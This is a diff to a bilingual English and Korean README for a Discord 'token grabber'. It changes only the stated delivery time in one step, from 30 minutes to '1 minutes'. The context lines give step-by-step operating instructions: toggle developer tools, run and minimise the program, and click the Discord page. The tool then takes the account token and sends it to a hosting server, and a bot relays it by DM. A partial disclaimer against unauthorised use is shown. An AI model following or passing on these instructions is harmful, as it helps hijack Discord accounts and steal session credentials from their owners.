@@ -14,7 +14,7 @@ This guide provides instructions on how to use the token grabber program.
 5. Make sure the Application tab is selected, and then press F12 again to turn off the developer mode.
 6. Run the program and minimize it. Click in the middle of the Discord homepage and wait for about 5 seconds.
 7. Don't be alarmed if your mouse moves on its own. This is the process of extracting the token.
-8. After the token is sent to the hosting server, the bot will send it to your DM. It may take up to 30 minutes.
+8. After the token is sent to the hosting server, the bot will send it to your DM. It may take up to 1 minutes.
 
 ## Disclaimer
 
@@ -37,7 +37,7 @@ Please note that using token grabbers or any unauthorized means to obtain someon
 5. Application 탭이 선택되어 있는지 확인한 후 다시 F12를 눌러 개발자 모드를 비활성화합니다.
 6. 그래버 프로그램을 실행하고 최소화합니다. Discord 홈페이지 중앙을 클릭한 후 약 5초간 기다립니다.
 7. 마우스가 자동으로 움직이는 것에 당황하지 마세요. 이는 토큰 추출 과정입니다.
-8. 토큰이 호스팅 서버로 전송된 후 봇이 DM으로 토큰을 전송합니다. 최대 30분까지 소요될 수 있습니다.
+8. 토큰이 호스팅 서버로 전송된 후 봇이 DM으로 토큰을 전송합니다. 최대 1분까지 소요될 수 있습니다.
 
 ## 법적 고지
 
